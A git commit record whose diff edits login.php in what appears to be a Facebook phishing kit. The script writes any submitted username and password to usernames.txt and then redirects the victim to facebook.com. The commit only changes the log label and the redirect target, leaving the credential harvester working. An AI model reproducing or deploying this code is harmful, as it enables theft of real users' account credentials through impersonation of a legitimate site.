3f47979c94f4a74b54ed0908da49eee66772cec7
yash <yashvyavahare02@gmail.com>
2023-06-10 13:22:44 +0530

    Modifing fb_Security page

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/recover/initiate/');
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://facebook.com/');
 exit();
 ?>
